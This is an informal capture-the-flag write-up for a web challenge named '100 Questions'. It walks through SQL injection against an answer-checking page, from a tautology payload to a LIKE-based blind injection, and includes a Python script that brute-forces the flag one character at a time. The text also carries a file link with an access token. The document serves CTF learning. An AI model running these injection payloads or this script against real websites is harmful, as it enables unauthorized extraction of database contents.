# 100 Questions
web challenge with SQL fuckery
http://34.124.157.94:5002/ , [file](https://ctfd.nusgreyhats.org/files/8b25ca3778248aafbd2d4e89bf6e6bbf/dist.zip?token=eyJ1c2VyX2lkIjo3NDUsInRlYW1faWQiOjg4LCJmaWxlX2lkIjo2NX0.ZGjZAg.wE1wLvWbA94jeckACTsZQVOpW3c)

Analyzing the database file, we see that question `42` is the flag thingy.

We can try the `'OR ''='` shit but that doesn't do anything since it just says "Correct" and doesn't give us the flag

so we use `LIKE` to compare, e.g. stuff like `Answer LIKE 'grey{__________}'`
(`_` means a *singular character* btw, and `%` means like 0, 1, or multiple chrs)

so we "inject" `' OR Answer LIKE 'grey{__________}`  to make it:
`f"SELECT * FROM QNA WHERE ID = {qn_id} AND Answer = '' OR Answer LIKE 'grey{__________}'"` (I just tried increasingly many `_` until it said Correct lmao)

So I realized we could figure each letter out individually with a script:
```python
import requests
url = "http://34.126.139.50:10513/?qn_id=42&ans="
str = "' OR Answer LIKE 'grey{"

arr = []
id = 40
while not correct:
    char = chr(id)
    res = requests.get(url=f"{url}{str}{''.join(arr)}{char}%")
    if id == 127:
        print("end: "+f"{url}{str}{''.join(arr)}{char}")
    elif 'No input / wrong!!!!' in res.text:
        id += 1
    elif 'Correct!' in res.text:
        arr.append(char)
        id = 40
        print("Correct: "+f"{url}{str}{''.join(arr)}{char}")
    else:
        print(f"{url}{str}{''.join(arr)}{char}")
        print(id)
        print('uh oh')
```
We search from ascii 40-127 (which is like most printable characters)

We get `grey{1_C4N7_533}` but its wrong since `LIKE` does not distinguish between upper and lowercase, so we try alternating the `C<->c` and the `N<->n` until we get `grey{1_c4N7_533}` which works

Hoot



